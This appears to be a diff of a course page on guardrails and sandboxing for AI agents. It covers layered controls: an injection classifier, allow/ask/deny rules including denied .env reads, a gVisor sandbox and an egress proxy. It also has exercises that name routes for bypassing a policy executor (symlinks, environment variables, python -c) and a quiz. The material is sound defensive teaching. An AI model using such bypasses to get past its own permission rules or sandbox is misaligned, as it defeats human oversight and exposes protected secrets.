+<div class="callout callout-example" role="note"><div class="callout-title"><span class="callout-icon" aria-hidden="true">🧪</span>A coding agent, layered</div><div class="callout-body"><p>Model trained with an instruction hierarchy. Fetched web pages pass an injection classifier; hits are flagged in context and logged. Edits and test runs inside the project directory are auto-allowed; <code>git push</code> asks; reading <code>.env</code> is denied; a <code>PreToolUse</code> hook blocks commands touching production hostnames. Everything runs in an ephemeral gVisor container with the repo mounted, network limited to the package registry and GitHub via a credential-injecting proxy, a 2 GB memory cap and a 30-minute timeout. Every call lands in an append-only log. An injection that hijacks the model can, at worst, write bad code to a branch that a human reviews.</p>
+</div></div>
+<h2 id="key-takeaways"><a class="anchor" href="#key-takeaways" aria-hidden="true" tabindex="-1">#</a>Key Takeaways</h2>
 <ul>
 <li><strong>Defense in depth</strong>: stack independent layers — model, input guardrails, output guardrails, action guardrails, sandbox, audit — so attacks must beat all of them.</li>
 <li>Probabilistic layers (classifiers, LLM judges) reduce how often bad things are attempted; <strong>deterministic layers</strong> (permissions, sandboxes, network policy) bound the damage. Put your guarantees in the deterministic ones.</li>
@@ -560,7 +560,7 @@ docker run --<span class="hljs-built_in">rm</span> \
 <li>Harden sandboxes with scoped and read-only mounts, no network or allowlisted egress, <strong>credential injection by proxy</strong>, resource and time limits, and ephemeral lifetimes.</li>
 <li>Calibrate controls to reversibility and blast radius; strong sandboxing is what lets you safely <em>reduce</em> permission prompts.</li>
 </ul>
-<h2 id="exercises"><a class="anchor" href="#exercises" aria-hidden="true">#</a>Exercises</h2>
+<h2 id="exercises"><a class="anchor" href="#exercises" aria-hidden="true" tabindex="-1">#</a>Exercises</h2>
 <ol>
 <li><strong>Classify actions (easy).</strong> For an agent that manages a small company&#39;s Google Workspace, list 15 plausible tool calls and assign each allow/ask/deny. Justify each using reversibility and blast radius. Which ones did you change your mind about?</li>
 <li><strong>Break the executor (medium).</strong> Using the <code>PolicyExecutor</code> above, try to read a denied file or run a denied command while staying inside allowed rules (hints: symlinks created by an allowed tool, environment variables, <code>python -c</code>, a <code>Makefile</code> target). Fix each bypass you find, and note which fixes belong in the executor versus the sandbox.</li>
@@ -568,7 +568,7 @@ docker run --<span class="hljs-built_in">rm</span> \
 <li><strong>Build an egress-proxied sandbox (medium–hard).</strong> Using Docker, create an internal network, a small forward proxy that allows only <code>pypi.org</code> and <code>files.pythonhosted.org</code>, and a sandbox container that can <code>pip install requests</code> but cannot <code>curl https://example.com</code>. Then add header injection for one API so the sandbox can call it without ever holding the key.</li>
 <li><strong>Evaluate a guardrail (hard).</strong> Assemble 200 benign tool outputs from your domain (including some that <em>discuss</em> prompt injection) and 100 injection attempts. Measure an open injection classifier&#39;s precision and recall at three thresholds. Decide which threshold you&#39;d ship and what action (log, flag, block, ask) each score band triggers.</li>
 </ol>
-<h2 id="check-your-understanding"><a class="anchor" href="#check-your-understanding" aria-hidden="true">#</a>Check Your Understanding</h2>
+<h2 id="check-your-understanding"><a class="anchor" href="#check-your-understanding" aria-hidden="true" tabindex="-1">#</a>Check Your Understanding</h2>
 <div class="quiz" data-quiz="guardrails-and-sandboxing" data-total="6">
 
 <div class="quiz-q" data-correct="3">
@@ -637,7 +637,7 @@ docker run --<span class="hljs-built_in">rm</span> \
   <div class="quiz-expl" hidden><strong class="quiz-verdict"></strong> Approval fatigue turns prompts into noise. Containing routine actions in a sandbox lets you allow them safely, so the remaining prompts carry meaning. Making approval more tedious or more frequent deepens the fatigue; removing every check discards real protection for consequential actions.</div>
 </div>
 <div class="quiz-footer"><div class="quiz-score" aria-live="polite"></div><button type="button" class="btn btn-ghost quiz-reset">Reset quiz</button></div>
-</div><h2 id="further-reading"><a class="anchor" href="#further-reading" aria-hidden="true">#</a>Further Reading</h2>
+</div><h2 id="further-reading"><a class="anchor" href="#further-reading" aria-hidden="true" tabindex="-1">#</a>Further Reading</h2>
 <ul>
 <li><a href="https://gvisor.dev/docs/" target="_blank" rel="noopener">gVisor documentation</a> — architecture of the user-space kernel and its security model.</li>
 <li><a href="https://firecracker-microvm.github.io/" target="_blank" rel="noopener">Firecracker</a> — AWS&#39;s microVM monitor; the design docs explain the minimal device model.</li>
@@ -664,7 +664,7 @@ docker run --<span class="hljs-built_in">rm</span> \
     <a class="pager-next" href="agent-safety-alignment.html"><small>Next →</small><span>Safety, Alignment &amp; Governance</span></a>
   </nav>
 </main>
-<aside class="toc" aria-label="On this page"><div class="toc-inner"><h4>On this page</h4><ul>
+<aside class="toc" aria-label="On this page"><div class="toc-inner"><p class="toc-title">On this page</p><ul>
 <li class="toc-h2"><a href="#defense-in-depth">Defense in Depth</a></li>
 <li class="toc-h2"><a href="#input-guardrails">Input Guardrails</a></li>
 <li class="toc-h3"><a href="#placement-and-latency">Placement and latency</a></li>
@@ -698,9 +698,9 @@ docker run --<span class="hljs-built_in">rm</span> \
     <div class="footer-brand"><a class="brand" href="index.html"><svg viewBox="0 0 32 32" width="26" height="26" aria-hidden="true"><defs><linearGradient id="lg" x1="0" y1="0" x2="1" y2="1"><stop offset="0" stop-color="#7c5cff"/><stop offset="1" stop-color="#22c3ee"/></linearGradient></defs><rect x="2" y="2" width="28" height="28" rx="8" fill="url(#lg)"/><path d="M10 21.5 16 9l6 12.5M12.3 17h7.4" fill="none" stroke="#fff" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/><circle cx="23.5" cy="9.5" r="2.2" fill="#fff"/></svg><span>Agent Academy</span></a>
       <p>A free, open, comprehensive course on AI agents — from first principles to production and the research frontier.</p></div>
     <div class="footer-cols">
-      <div><h4>Learn</h4><a href="curriculum.html">Curriculum</a><a href="paths.html">Learning paths</a><a href="lab.html">Interactive lab</a><a href="projects.html">Hands-on projects</a></div>
-      <div><h4>Practice</h4><a href="review.html">Course review</a><a href="flashcards.html">Flashcards</a><a href="exam.html">Practice exam</a><a href="progress.html">Your progress</a></div>
-      <div><h4>Reference</h4><a href="glossary.html">Glossary</a><a href="papers.html">Reading list</a><a href="cheatsheet.html">Cheat sheet</a><a href="about.html">About</a></div>
+      <div><p class="footer-h">Learn</p><a href="curriculum.html">Curriculum</a><a href="paths.html">Learning paths</a><a href="lab.html">Interactive lab</a><a href="projects.html">Hands-on projects</a></div>
+      <div><p class="footer-h">Practice</p><a href="review.html">Course review</a><a href="flashcards.html">Flashcards</a><a href="exam.html">Practice exam</a><a href="progress.html">Your progress</a></div>
+      <div><p class="footer-h">Reference</p><a href="glossary.html">Glossary</a><a href="papers.html">Reading list</a><a href="cheatsheet.html">Cheat sheet</a><a href="about.html">About</a></div>
     </div>
   </div>
   <p class="footer-note">Content current as of November 2026. The field moves fast — principles age slower than product names. Progress is stored only in your browser.</p>
